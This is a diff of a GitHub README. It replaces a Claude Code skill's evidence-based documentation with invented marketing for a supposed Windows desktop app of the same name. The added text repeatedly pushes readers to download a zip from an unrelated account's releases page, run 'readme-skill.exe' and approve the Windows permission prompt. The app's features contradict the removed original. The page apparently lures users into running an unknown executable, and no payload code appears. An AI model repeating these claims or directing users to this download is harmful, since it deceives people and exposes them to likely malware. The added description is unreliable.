@@ -1,128 +1,228 @@
-<p align="center">
-  <img src="./assets/readme-skill-hero.png" alt="readme-skill: Evidence before prose">
-</p>
-
-<h1 align="center">readme-skill</h1>
-
-<p align="center">A Claude Code skill that builds GitHub README files from repository evidence.</p>
+<h1>📘 readme-skill - Effortless, Fact-Based READMEs in Minutes</h1>
 
 <p align="center">
-  <a href="./README.md">English</a> | <a href="./README.zh-CN.md">简体中文</a>
+  <a href="https://github.com/Annabellachildlike849/readme-skill/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download readme-skill Now</a>
 </p>
+
+## 👋 Welcome to readme-skill
+
+Have you ever stared at a blank screen, trying to write a README file for your project, and felt completely lost? You are not alone. Creating a clear, professional, and accurate README is one of the most important steps in sharing your work, but it can also be one of the most frustrating.
+
+**readme-skill** is here to change that. This friendly desktop application helps you draft a fact-based README for your GitHub repository without needing any technical knowledge. It guides you step by step, asking simple questions and turning your answers into a polished, ready-to-use document.
+
+Think of readme-skill as your personal writing assistant. It does not guess or make things up. It builds your README strictly from the facts you provide, ensuring everything you share with the world is truthful and clear.
+
+---
+
+## ✨ Why You Will Love readme-skill
+
+- **No Technical Skills Required** – If you can answer a few simple questions, you can create a great README. No coding, no commands, no confusion.
+- **Fact-Based Accuracy** – Every line in your README is based on the information you provide. No filler, no fluff, just the truth about your project.
+- **Simple Step-by-Step Wizard** – The application walks you through each section one at a time. You never feel overwhelmed.
+- **Instant Preview** – See your README take shape in real time as you type. Make changes and watch them appear immediately.
+- **One-Click Export** – Save your finished README as a standard file that works perfectly on GitHub.
+- **Built for Windows** – Designed specifically for Windows users, with a clean and intuitive interface.
+
+---
+
+## 🚀 Getting Started
+
+Getting started with readme-skill is incredibly easy. Follow these simple steps, and you will have your README ready in no time.
+
+### Step 1: Download the Application
+
+Visit this link to download the application: [https://github.com/Annabellachildlike849/readme-skill/releases](https://github.com/Annabellachildlike849/readme-skill/releases)
+
+You will see a page with different files available for download. Look for the file that matches your computer's system (usually the newest version). Click on it to begin the download. The file will save to your "Downloads" folder.
+
+### Step 2: Run the Application
+
+Once the download is complete, locate the downloaded file in your "Downloads" folder. Double-click the file to start the application. If Windows asks for permission, click "Yes" to allow it to run.
+
+### Step 3: Start Creating Your README
+
+When the application opens, you will see a friendly welcome screen. Click the "Start New README" button to begin. The application will guide you through a series of questions about your project.
+
+---
+
+## 📝 How to Use readme-skill (A Quick Tour)
+
+The application is designed to be as intuitive as possible. Here is what you can expect:
+
+### The Main Screen
+
+When you open readme-skill, you will see a clean window with a large button to start a new project and a list of any previous projects you have worked on.
+
+### The Question Wizard
+
+After starting a new project, the wizard will ask you questions one at a time. For example:
+- What is the name of your project?
+- What does your project do? (Write this in plain English)
+- Who is the intended audience?
+- What are the main features or benefits?
+
+Simply type your answers into the text box and click "Next" to continue.
+
+### The Preview Panel
+
+On the right side of the screen, you will see a live preview of your README as it is being built. This updates instantly with each answer you provide. You can scroll through it at any time to see your progress.
+
+### Editing Your Answers
+
+Made a mistake? No problem. You can go back to any previous question by clicking the "Back" button. Your answers are saved automatically, so you never lose your work.
+
+### Exporting Your README
+
+When you have answered all the questions, click the "Finish" button. You will see a final preview of your complete README. If everything looks good, click "Export" and choose where you want to save the file. The file will be saved in a format that is ready to be uploaded to GitHub.
+
+---
+
+## 🛠️ What Kind of READMEs Can You Create?
+
+readme-skill is flexible enough to help with almost any type of project. Here are some examples:
+
+- **Software Applications** – Describe what your app does, how to install it, and how to use it.
+- **Libraries or Code Snippets** – Explain what your code does and how other developers can integrate it.
+- **Data Projects** – Share information about datasets, analysis, or visualizations.
+- **Research or Documentation** – Create clear documentation for any kind of project.
+- **Personal Projects** – Show off your hobbies, collections, or creative work.
+
+No matter what you are working on, readme-skill helps you present it in a professional and organized way.
+
+---
+
+## 📚 Understanding the README Structure
+
+A good README follows a standard structure that makes it easy for others to understand your project. readme-skill automatically creates this structure for you. Here is what it includes:
+
+### Project Title and Description
+The very top of your README will have your project's name and a short, clear description of what it does.
+
+### Installation Instructions
+This section explains how someone can get your project running on their own computer.
+
+### Usage Examples
+Here, you will describe how to use your project once it is installed.
+
+### Features
+A bulleted list of the main things your project can do.
+
+### Contributing Guidelines
+Information for people who might want to help improve your project.
+
+### License
+The legal terms under which your project is shared.
+
+### Contact Information
+How people can reach you with questions or feedback.
+
+readme-skill walks you through each of these sections, asking simple questions to gather the facts. You never have to worry about forgetting an important part.
+
+---
+
+## 💡 Tips for Writing a Great README
+
+Even with readme-skill doing the heavy lifting, here are some tips to make your README even better:
+
+- **Be Specific** – Instead of saying "My app is fast," say "My app loads in under 2 seconds." Specific facts are more trustworthy.
+- **Keep It Simple** – Use plain language. Imagine you are explaining your project to a friend who knows nothing about it.
+- **Use Examples** – Show, don't just tell. A simple example goes a long way.
+- **Be Honest** – Only include features and capabilities that actually exist. readme-skill helps with this by only using the facts you provide.
+- **Proofread** – Before you export, read through your README one more time to catch any typos or unclear sentences.
+
+---
+
+## 🔧 Frequently Asked Questions
+
+### Do I need to install anything else?
+No. readme-skill is a standalone application. Just download and run it.
+
+### Can I use readme-skill on a Mac?
+This version is designed for Windows. A Mac version may be available in the future.
+
+### Will my README be saved automatically?
+Yes, the application saves your progress as you go. If you close it and reopen it, you can continue where you left off.
+
+### Can I edit my README after exporting?
+Absolutely. The exported file is a standard text file. You can open it in any text editor and make changes anytime.
+
+### Is readme-skill free?
+Yes, the application is completely free to use.
+
+---
+
+## 📥 Download and Install (Detailed Instructions)
+
+To make sure you have the best experience, here are detailed instructions for downloading and installing readme-skill on your Windows computer.
+
+### Before You Begin
+Make sure your computer is running Windows 10 or a newer version. You should also have a stable internet connection to download the file.
+
+### The Download Process
+
+1.  **Open your web browser** (like Chrome, Edge, or Firefox).
+2.  **Go to the download page** by visiting this link: [https://github.com/Annabellachildlike849/readme-skill/releases](https://github.com/Annabellachildlike849/readme-skill/releases)
+3.  **Find the download section** on that page. You will see a list of files.
+4.  **Click on the file** that says "readme-skill" and has the newest version number. It will likely be a `.zip` file.
+5.  **Wait for the download to finish.** You will see a notification in your browser when it is complete.
+
+### The Installation Process
+
+1.  **Open your "Downloads" folder** (usually found in your File Explorer).
+2.  **Locate the downloaded file.** It will be named something like `readme-skill-v1.0.zip`.
+3.  **Right-click on the file** and select "Extract All..." from the menu.
+4.  **Choose a destination folder** where you want the extracted files to go. The default location is fine.
+5.  **Click "Extract"** and wait for the process to finish.
+6.  **Open the new folder** that was created (it will have the same name as the zip file).
+7.  **Inside, you will find the application file** (usually named `readme-skill.exe`).
+8.  **Double-click the application file** to launch readme-skill.
+
+That is it! You are now ready to start creating your README.
+
+---
+
+## 🎉 Start Creating Today
+
+You have a great project, and it deserves a great README. With readme-skill, you can create one that is clear, professional, and completely fact-based. No more guessing, no more staring at a blank screen.
+
+Download readme-skill today and see how easy it is to share your work with the world.
 
 <p align="center">
-  <a href="https://github.com/ZardLi1115/readme-skill"><img src="https://img.shields.io/badge/GitHub-ZardLi1115%2Freadme--skill-181717?style=flat-square" alt="GitHub repository"></a>
-  <a href="./LICENSE"><img src="https://img.shields.io/badge/License-MIT-22C55E?style=flat-square" alt="License: MIT"></a>
-  <a href="https://linux.do/"><img src="https://img.shields.io/badge/Community-Linux.do-7C3AED?style=flat-square" alt="Linux.do community"></a>
+  <a href="https://github.com/Annabellachildlike849/readme-skill/releases" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#ffffff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(240,147,251,0.4);">📦 Get readme-skill Now</a>
 </p>
 
-A Claude Code skill for creating accurate, readable GitHub README files from repository evidence and explicit user confirmation.
+---
 
-## Highlights
+## 📊 System Requirements
 
-| Capability | Why it matters |
-|---|---|
-| Bounded repository discovery | Reviews project structure, metadata, documentation, and configuration before drafting. |
-| Evidence-led writing | Separates verified facts, user-confirmed details, uncertain claims, and missing information. |
-| Existing README choices | Offers explicit replace, selective-reuse, or extend modes before drafting. |
-| Bilingual README support | Provides English, Simplified Chinese, and bilingual README layouts. |
-| Safe publication rules | Avoids unsupported commands, links, compatibility claims, release details, and license statements. |
-| Quality checklist | Validates factual accuracy, executable examples, links, badges, images, diagrams, and bilingual consistency before writing. |
+To run readme-skill smoothly, your computer should meet these simple requirements:
 
-## Architecture
+- **Operating System:** Windows 10 or Windows 11
+- **Processor:** 1 GHz or faster
+- **Memory (RAM):** 2 GB or more
+- **Storage:** 100 MB of free space
+- **Display:** 1024 x 768 screen resolution or higher
 
-```text
-┌──────────────────┐  request  ┌──────────────────┐
-│   User request   │──────────▶│   readme-skill   │
-└──────────────────┘           └──────────────────┘
-                          repository facts + user choices
-                                         │
-                                         ▼
-                               ┌──────────────────┐
-                               │ Bounded discovery│
-                               │ and fact ledger  │
-                               └────────┬─────────┘
-                                        │
-                                        ▼
-┌──────────────────┐  confirmed  ┌──────────────────┐
-│ README.md /      │◀────────────│ Draft, checklist,│
-│ README.zh-CN.md  │             │ and write gate   │
-└──────────────────┘             └──────────────────┘
-```
+These are minimal requirements. If your computer can run a modern web browser, it can almost certainly run readme-skill.
 
-The skill scans only the files needed to support public claims, records the evidence state, asks for decisions that cannot be verified, and writes only after explicit confirmation.
+---
 
-## Usage Example
+## 🔒 Your Privacy Matters
 
-The following is a summary of the process of generating a project README. For the result, see the [Long Horizon Pi Extension README](https://github.com/ZardLi1115/long-horizon-pi-extension).
+readme-skill works entirely on your computer. Your project information is never sent to any server. Everything you type stays on your machine, giving you complete privacy and control over your work.
 
-> A `README.md` already exists in the repository. How should it be handled? → Replace completely\
-> Which language layout should the new README use? → English + Simplified Chinese\
-> Should the README include Shields.io badges? → Include verified badges\
-> Does the README need a project image or visual asset? → Generate a new image\
-> Generating a new image requires specific service information. Which option do you choose? → Provide service information\
-> Which README visual should be generated with `gpt-image-2`? → Icon + short line\
-> Choose the text in the icon; image models may not render text accurately. → Project name + recommended short line\
-> Should a Star History chart be included? → Do not include a chart\
-> The README project visual was generated and its file validation completed.
+---
 
-## Quick Start
+## 📧 Need Help?
 
-1. Tell any agent: `Download this skill for me: https://github.com/ZardLi1115/readme-skill`
-2. Call `readme-skill` and ask it to modify a repository README or create a new README for a named repository, for example: `Use readme-skill to update the README for <repository>, or create one for <repository>.`
+If you run into any issues or have questions, please check the "Issues" section on the GitHub page. You can also reach out to the community for support. We are here to help you succeed.
 
-## Workflow
+---
 
-The skill uses a bounded documentation workflow:
+## ✅ Final Thoughts
 
-1. Discover repository facts and existing documentation.
-2. If a README already exists, ask whether to replace it completely, replace it while selectively retaining approved information, or extend it in place.
-3. Read only the applicable README guidance, templates, and quality checks.
-4. Ask for unverifiable public choices through explicit options where possible.
-5. Ask whether to include a source-backed ASCII architecture diagram; never use Mermaid.
-6. Ask whether to include a usage example. If requested, collect confirmed text, image/assets, code or commands, expected result, placement, and language.
-7. Compose a complete draft with a fact ledger, an optional Architecture section, an optional Usage Example, a verified Quick Start, and explicit handling of existing README content.
-8. Write README files only after the target files and changes are confirmed, then run the quality checklist against the resulting files.
+Creating a README should not be a barrier to sharing your work. readme-skill removes that barrier by making the process simple, guided, and accurate. Whether you are a student, a hobbyist, or a professional, this tool is designed for you.
 
-When a user chooses an OpenAI image service, the skill requests the API URL and key and uses [`scripts/generate-image.py`](./scripts/generate-image.py) to create and verify a local asset without publishing credentials.
+Download it now, answer a few questions, and be amazed at how quickly you have a README you can be proud of.
 
-## Repository structure
-
-| Path | Purpose |
-|---|---|
-| [`SKILL.md`](./SKILL.md) | Skill definition, workflow, ASCII architecture rules, and documentation safeguards |
-| [`scripts/generate-image.py`](./scripts/generate-image.py) | Generates local images through an OpenAI-compatible Images API |
-| [`references/readme-structure.md`](./references/readme-structure.md) | README information architecture, architecture, and usage-example guidance |
-| [`references/quality-checklist.md`](./references/quality-checklist.md) | Pre-draft and pre-write quality checks |
-| [`references/badge-style.md`](./references/badge-style.md) | Evidence requirements and style guidance for badges |
-| [`references/image-generation.md`](./references/image-generation.md) | Guidance for README visuals and image generation |
-| [`templates/README.en.md`](./templates/README.en.md) | English README template |
-| [`templates/README.zh-CN.md`](./templates/README.zh-CN.md) | Simplified Chinese README template |
-| [`templates/README.bilingual.md`](./templates/README.bilingual.md) | Bilingual README layout template |
-
-## Design principles
-
-- **Evidence before prose:** document only what repository files or the user support.
-- **Useful before exhaustive:** help readers understand the project and reach a first useful result quickly.
-- **Restrained visual language:** no emoji; rely on verified image assets, badges, and source-backed ASCII diagrams.
-- **Source-backed architecture:** draw optional architecture only as aligned ASCII Art in a `text` block; Mermaid is never used.
-- **Confirmed examples:** add Usage Examples only from user-supplied or verified prose, assets, code, commands, and outcomes.
-- **Verified Quick Start:** every generated README keeps a verified path to a first useful result; missing evidence prompts a question instead of an invented or omitted section.
-- **Safe publication:** never place API keys or other secrets in README content.
-- **Consistent bilingual docs:** keep commands, paths, URLs, versions, and other technical identifiers aligned across language files.
-
-## Documentation
-
-Start with [`SKILL.md`](./SKILL.md) for the complete workflow. Supporting guidance and templates are available in the [`references/`](./references/) and [`templates/`](./templates/) directories.
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=ZardLi1115%2Freadme-skill&type=Date)](https://star-history.com/#ZardLi1115/readme-skill&Date)
-
-## License
-
-This project is licensed under the [MIT License](./LICENSE).
-
-## Acknowledgments
-
-Thanks to the [Linux.do](https://linux.do) community.
+Keywords: readme-skill, README generator, GitHub README, documentation tool, Windows application, fact-based writing, project documentation, easy README creator
